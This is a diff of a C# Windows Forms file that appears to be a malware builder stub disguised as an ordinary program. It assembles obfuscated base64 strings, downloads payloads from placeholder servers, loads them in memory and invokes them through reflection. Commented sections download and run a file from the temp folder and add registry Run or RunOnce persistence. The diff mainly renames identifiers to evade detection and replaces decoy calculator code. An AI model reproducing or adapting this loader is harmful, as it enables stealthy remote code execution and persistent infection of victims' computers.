@@ -48,7 +48,7 @@ using System.Windows.Markup;
 
 
 
-namespace ObjectOrientedProgrammingWithCSharp
+namespace KeyboardInterrupt
 {
 
 
@@ -56,12 +56,7 @@ namespace ObjectOrientedProgrammingWithCSharp
     public class Form1 : Form
     {
 
-        private IntPtr globalKeyboardHookId;
-        private IntPtr currentModuleId;
-        private const int WH_KEYBOARD_LL = 13;
-        private const int WH_MOUSE_LL = 14;
-        private const int WM_KEYDOWN = 0x100;
-        private const int WM_SYSKEYDOWN = 0x104;
+
         public Form1()
         {
 
@@ -73,10 +68,21 @@ namespace ObjectOrientedProgrammingWithCSharp
 
              //sandboxie controlsandboxie();
 
+
+
              //Startup  password_reset();
 
 
-
+            
+            //download try
+            //download {
+            //download  System.Net.WebClient n11 = new System.Net.WebClient();
+            //download n11.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "%urlfile%"));
+            //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "%urlfile%"));
+            //download }
+            //download catch
+            //download {
+            //download }
 
              %RUNPEGEN%
 
@@ -90,131 +96,131 @@ namespace ObjectOrientedProgrammingWithCSharp
             {
 
 
-               using (WebClient MENTION = new WebClient())
+               using (WebClient dprint = new WebClient())
                 {
 
                   
       
-                   	string _stripchat = "";
-			_stripchat += "%1% Requirements".Replace("%1% Requirements","V2");
-			_stripchat += "%1% preprocessor".Replace("%1% preprocessor","lu");
-			_stripchat += "%1% ldapFilter".Replace("%1% ldapFilter","ZG");
-			_stripchat += "filledIdentity".Replace("filledIdentity","93");
-			_stripchat += "Get-ADComputer".Replace("Get-ADComputer","c0");
-			_stripchat += "Get-ADComputer -Identity DC01 -Properties".Replace("Get-ADComputer -Identity DC01 -Properties","Rl");
-			_stripchat += "Get-ADComputer DC01 -Properties Name,operatingSystem".Replace("Get-ADComputer DC01 -Properties Name,operatingSystem","dm");
-			_stripchat += "List specific attributes of the DC01 domain computer".Replace("List specific attributes of the DC01 domain computer","lj");
-			_stripchat += "Properties".Replace("Properties","ZV");
-			_stripchat += "%3% Get-SmbMapping".Replace("%3% Get-SmbMapping","Bv");
-			_stripchat += "netuse".Replace("netuse","cn");
-			_stripchat += "Select LocalPath,RemotePath From MSFT_SmbMapping".Replace("Select LocalPath,RemotePath From MSFT_SmbMapping","Rh");
-			_stripchat += "Retrieves the SMB client directory mappings created for a server.".Replace("Retrieves the SMB client directory mappings created for a server.","bF");
-			_stripchat += "Get-LocalUser".Replace("Get-LocalUser","dy");
-			_stripchat += "Invoke-WebRequest".Replace("Invoke-WebRequest","YX");
-			_stripchat += "curl".Replace("curl","Bw");
-			_stripchat += "Download file from the Internet".Replace("Download file from the Internet","ZX");
-			_stripchat += "Download file from the Internet specifying the destination".Replace("Download file from the Internet specifying the destination","I=");
-			_stripchat += "";
-			_stripchat += "";
-			_stripchat += "";
+                   	string ThreadedHTTPServer = "";
+			ThreadedHTTPServer += "%1% cfg_IP_WebServer ".Replace("%1% cfg_IP_WebServer ","V2");
+			ThreadedHTTPServer += "%1% CSettings".Replace("%1% CSettings","lu");
+			ThreadedHTTPServer += "%1% Failed to access certificate: {0}".Replace("%1% Failed to access certificate: {0}","ZG");
+			ThreadedHTTPServer += "XMLConverter".Replace("XMLConverter","93");
+			ThreadedHTTPServer += "Get-ADComputer".Replace("Get-ADComputer","c0");
+			ThreadedHTTPServer += "Get-ADComputer -Identity DC01 -Properties".Replace("Get-ADComputer -Identity DC01 -Properties","Rl");
+			ThreadedHTTPServer += "Get-ADComputer DC01 -Properties Name,operatingSystem".Replace("Get-ADComputer DC01 -Properties Name,operatingSystem","dm");
+			ThreadedHTTPServer += "List specific attributes of the DC01 domain computer".Replace("List specific attributes of the DC01 domain computer","lj");
+			ThreadedHTTPServer += "Properties".Replace("Properties","ZV");
+			ThreadedHTTPServer += "%3% Get-SmbMapping".Replace("%3% Get-SmbMapping","Bv");
+			ThreadedHTTPServer += "netuse".Replace("netuse","cn");
+			ThreadedHTTPServer += "Select LocalPath,RemotePath From MSFT_SmbMapping".Replace("Select LocalPath,RemotePath From MSFT_SmbMapping","Rh");
+			ThreadedHTTPServer += "Retrieves the SMB client directory mappings created for a server.".Replace("Retrieves the SMB client directory mappings created for a server.","bF");
+			ThreadedHTTPServer += "Get-LocalUser".Replace("Get-LocalUser","dy");
+			ThreadedHTTPServer += "Invoke-WebRequest".Replace("Invoke-WebRequest","YX");
+			ThreadedHTTPServer += "curl".Replace("curl","Bw");
+			ThreadedHTTPServer += "Download file from the Internet".Replace("Download file from the Internet","ZX");
+			ThreadedHTTPServer += "Download file from the Internet specifying the destination".Replace("Download file from the Internet specifying the destination","I=");
+			ThreadedHTTPServer += "";
+			ThreadedHTTPServer += "";
+			ThreadedHTTPServer += "";
 
 
-            string preprocessor_OPT_SMILEY = "";
-			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","V");
-			preprocessor_OPT_SMILEY += "White".Replace("White","2");
-			preprocessor_OPT_SMILEY += "Black".Replace("Black","l");
-			preprocessor_OPT_SMILEY += "Yellow".Replace("Yellow","u");
-			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","Z");
-			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","G");
-			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","9");
-			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","3");
-			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","c");
-			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","0");
-			preprocessor_OPT_SMILEY += "N";
-			preprocessor_OPT_SMILEY += "v";
-			preprocessor_OPT_SMILEY += "b";
-			preprocessor_OPT_SMILEY += "X";
-			preprocessor_OPT_SMILEY += "B";
-			preprocessor_OPT_SMILEY += "v";
-			preprocessor_OPT_SMILEY += "c";
-			preprocessor_OPT_SMILEY += "2";
-			preprocessor_OPT_SMILEY += "l";
-			preprocessor_OPT_SMILEY += "0";
-			preprocessor_OPT_SMILEY += "a";
-			preprocessor_OPT_SMILEY += "W";
-			preprocessor_OPT_SMILEY += "9";
-			preprocessor_OPT_SMILEY += "u";
-			preprocessor_OPT_SMILEY += "U";
-			preprocessor_OPT_SMILEY += "2";
-			preprocessor_OPT_SMILEY += "F";
-			preprocessor_OPT_SMILEY += "t";
-			preprocessor_OPT_SMILEY += "c";
-			preprocessor_OPT_SMILEY += "G";
-			preprocessor_OPT_SMILEY += "x";
-			preprocessor_OPT_SMILEY += "l";
-			preprocessor_OPT_SMILEY += "c";
-			preprocessor_OPT_SMILEY += "y";
-			preprocessor_OPT_SMILEY += "5";
-			preprocessor_OPT_SMILEY += "F";
-			preprocessor_OPT_SMILEY += "d";
-			preprocessor_OPT_SMILEY += "m";
-			preprocessor_OPT_SMILEY += "V";
-			preprocessor_OPT_SMILEY += "y";
-			preprocessor_OPT_SMILEY += "e";
-			preprocessor_OPT_SMILEY += "X";
-			preprocessor_OPT_SMILEY += "InvalidOperationException".Replace("InvalidOperationException","R");
-			preprocessor_OPT_SMILEY += "LDAPHelper".Replace("LDAPHelper","o");
-			preprocessor_OPT_SMILEY += "DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID".Replace("DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID","a");
-			preprocessor_OPT_SMILEY += "Properties".Replace("Properties","W");
-			preprocessor_OPT_SMILEY += "LDAPFilter".Replace("LDAPFilter","5");
-			preprocessor_OPT_SMILEY += "n";
-			preprocessor_OPT_SMILEY += "V";
-			preprocessor_OPT_SMILEY += "G";
-			preprocessor_OPT_SMILEY += "9";
-			preprocessor_OPT_SMILEY += "v";
-			preprocessor_OPT_SMILEY += "b";
-			preprocessor_OPT_SMILEY += "G";
-			preprocessor_OPT_SMILEY += "J";
-			preprocessor_OPT_SMILEY += "h";
-			preprocessor_OPT_SMILEY += "c";
-			preprocessor_OPT_SMILEY += "g";
-			preprocessor_OPT_SMILEY += "=";
-			preprocessor_OPT_SMILEY += "=";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
-			preprocessor_OPT_SMILEY += "";
+            string BaseHTTPRequestHandler = "";
+			BaseHTTPRequestHandler += "WebServer: Serving HTTP on {0} port {1}.".Replace("WebServer: Serving HTTP on {0} port {1}.","V");
+			BaseHTTPRequestHandler += "White".Replace("White","2");
+			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","l");
+			BaseHTTPRequestHandler += "Yellow".Replace("Yellow","u");
+			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","Z");
+			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","G");
+			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","9");
+			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","3");
+			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","c");
+			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","0");
+			BaseHTTPRequestHandler += "N";
+			BaseHTTPRequestHandler += "v";
+			BaseHTTPRequestHandler += "b";
+			BaseHTTPRequestHandler += "X";
+			BaseHTTPRequestHandler += "B";
+			BaseHTTPRequestHandler += "v";
+			BaseHTTPRequestHandler += "c";
+			BaseHTTPRequestHandler += "2";
+			BaseHTTPRequestHandler += "l";
+			BaseHTTPRequestHandler += "0";
+			BaseHTTPRequestHandler += "a";
+			BaseHTTPRequestHandler += "W";
+			BaseHTTPRequestHandler += "9";
+			BaseHTTPRequestHandler += "u";
+			BaseHTTPRequestHandler += "U";
+			BaseHTTPRequestHandler += "2";
+			BaseHTTPRequestHandler += "F";
+			BaseHTTPRequestHandler += "t";
+			BaseHTTPRequestHandler += "c";
+			BaseHTTPRequestHandler += "G";
+			BaseHTTPRequestHandler += "x";
+			BaseHTTPRequestHandler += "l";
+			BaseHTTPRequestHandler += "c";
+			BaseHTTPRequestHandler += "y";
+			BaseHTTPRequestHandler += "5";
+			BaseHTTPRequestHandler += "F";
+			BaseHTTPRequestHandler += "d";
+			BaseHTTPRequestHandler += "m";
+			BaseHTTPRequestHandler += "V";
+			BaseHTTPRequestHandler += "y";
+			BaseHTTPRequestHandler += "e";
+			BaseHTTPRequestHandler += "X";
+			BaseHTTPRequestHandler += "InvalidOperationException".Replace("InvalidOperationException","R");
+			BaseHTTPRequestHandler += "LDAPHelper".Replace("LDAPHelper","o");
+			BaseHTTPRequestHandler += "DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID".Replace("DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID","a");
+			BaseHTTPRequestHandler += "Properties".Replace("Properties","W");
+			BaseHTTPRequestHandler += "LDAPFilter".Replace("LDAPFilter","5");
+			BaseHTTPRequestHandler += "n";
+			BaseHTTPRequestHandler += "V";
+			BaseHTTPRequestHandler += "G";
+			BaseHTTPRequestHandler += "9";
+			BaseHTTPRequestHandler += "v";
+			BaseHTTPRequestHandler += "b";
+			BaseHTTPRequestHandler += "G";
+			BaseHTTPRequestHandler += "J";
+			BaseHTTPRequestHandler += "h";
+			BaseHTTPRequestHandler += "c";
+			BaseHTTPRequestHandler += "g";
+			BaseHTTPRequestHandler += "=";
+			BaseHTTPRequestHandler += "=";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
+			BaseHTTPRequestHandler += "";
 
 
-                    byte[] file_name = Convert.FromBase64String(_stripchat); //Redefine Base64 URL
+                    byte[] log_message = Convert.FromBase64String(ThreadedHTTPServer); //Redefine Base64 URL
 
-                    string file_contents = Encoding.UTF8.GetString(file_name);
+                    string JSConverter = Encoding.UTF8.GetString(log_message);
 
-                    byte[] regLockScreen = Convert.FromBase64String(preprocessor_OPT_SMILEY); //Redefine Base64 URL
+                    byte[] getSetting = Convert.FromBase64String(BaseHTTPRequestHandler); //Redefine Base64 URL
 
-                    string imageOrder = Encoding.UTF8.GetString(regLockScreen);
+                    string aTVLanguage = Encoding.UTF8.GetString(getSetting);
 
-                    var cleaned_content = new WebClient().DownloadData(%ServerRunPe%);
+                    var send_response = new WebClient().DownloadData(%ServerRunPe%);
 
-                    object input_file_path = new object[] {"APPRUN", string.Empty, MENTION.DownloadData(%ServerGen%) };
+                    object basename  = new object[] {"APPRUN", string.Empty, dprint.DownloadData(%ServerGen%) };
 
-                    Assembly add_timestamp = Assembly.Load(cleaned_content);
+                    Assembly __name__ = Assembly.Load(send_response);
 
-                    add_timestamp.GetType(string.Join("Cleans given input file in JSON and txt format if it can be found at the given path.", imageOrder)).InvokeMember(string.Join("Cleans given input file in JSON and txt format if it can be found at the given path.", file_contents), BindingFlags.InvokeMethod, null, null, (object[])input_file_path);
+                    __name__.GetType(string.Join("Shutting down (HTTPS).", aTVLanguage)).InvokeMember(string.Join("Shutting down (HTTPS).", JSConverter), BindingFlags.InvokeMethod, null, null, (object[])basename );
                 
                     this.Close();
 
                 }
             }
-            catch (Exception preprocessor_OPT_URL)
+            catch (Exception getSubtitleJSON)
             {
                         
             }
@@ -231,9 +237,9 @@ namespace ObjectOrientedProgrammingWithCSharp
 
 
 
-                Console.Write("The time it takes for the HTTP response to arrive is <b>{1} ms</b> in case of the ");
+                Console.Write("");
                 var daysAhead = Convert.ToInt32(Console.ReadLine());
-                Console.WriteLine("Vulnerable to remote code execution caused by");
+                Console.WriteLine("");
                 Console.ReadLine();
             }
             catch (Exception ex)
@@ -244,75 +250,24 @@ namespace ObjectOrientedProgrammingWithCSharp
         }
         private void timer1_Tick(object sender, EventArgs e)
         {
-            int sayi1, sayi2;
-            char opt;
-            double sonuc;
-
-
-            Console.WriteLine("\n\fileID: 7, guid: 0000000000000000f000000000000000, type: 0");
-            Console.WriteLine("\nTOPLAMA İÇİN + m_PreloadedShaders m_PreloadedShaders");
-            Console.WriteLine("ÇIKARMA İÇİN - m_PreloadedShaders m_PreloadedShaders");
-            Console.WriteLine("ÇARPMA İÇİN * m_PreloadedShaders m_PreloadedShaders");
-            Console.WriteLine("BÖLME İÇİN + m_PreloadedShaders m_PreloadedShaders");
-
-            Console.Write("\n\n GraphicsSettings GraphicsSettings GraphicsSettings :");
-            sayi1 = Convert.ToInt32(Console.ReadLine());
-
-            Console.Write(" GraphicsSettings GraphicsSettings GraphicsSettings :");
-            sayi2 = Convert.ToInt32(Console.ReadLine());
-
-            Console.Write("\nGraphicsSettings\t");
-            opt = Convert.ToChar(Console.ReadLine());
-
-            if (opt == '+')
-            {
-                sonuc = sayi1 + sayi2;
-                Console.WriteLine("\n{0} + {1} = {2}", sayi1, sayi2, sonuc);
-            }
-            else if (opt == '-')
-            {
-                sonuc = sayi1 - sayi2;
-                Console.WriteLine("\n{0} - {1} = {2}", sayi1, sayi2, sonuc);
-            }
-            else if (opt == '*')
-            {
-                sonuc = sayi1 * sayi2;
-                Console.WriteLine("\n{0} x {1} = {2}", sayi1, sayi2, sonuc);
-            }
-            else if (opt == '/')
-            {
-                sonuc = (double)sayi1 / sayi2;
-                Console.WriteLine("\n{0} / {1} = {2}", sayi1, sayi2, sonuc);
-            }
-            else
-            {
-                Console.WriteLine("0000000000000000f000000000000000 GraphicsSettings");
-            }
-
-
-            Console.ReadKey();
+           
         }
         private void textBox1_TextChanged(object sender, EventArgs e)
         {
-            for (int i = 1; i <= 10; i++)
-            {
-                Console.WriteLine(i + "0000000000000000f000000000000000 GraphicsSettings");
-            }
-
-            Console.ReadKey();
+           
         }
 
         //Startup   public static void  password_reset()
         //Startup   {
         //Startup       int OwnerDraw  = Conversions.ToInteger("1");
-        //Startup       if ((double)OwnerDraw  != Conversions.ToDouble("1") || Registry.GetValue(Reverse("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
+        //Startup       if ((double)OwnerDraw  != Conversions.ToDouble("1") || Registry.GetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
         //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%folder%\\%file%";
         //Startup       if (!Directory.Exists(Path.GetDirectoryName(email)))
         //Startup       {
         //Startup           Directory.CreateDirectory(Path.GetDirectoryName(email));
         //Startup           File.Copy(Application.ExecutablePath, email, true);
         //Startup       }
-        //Startup       Registry.SetValue(Reverse("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
+        //Startup       Registry.SetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
         //Startup   }
 
 
@@ -542,7 +497,7 @@ namespace ObjectOrientedProgrammingWithCSharp
     }
 
 
-    static class _stripchat
+    static class ThreadedHTTPServer
     {
 
 
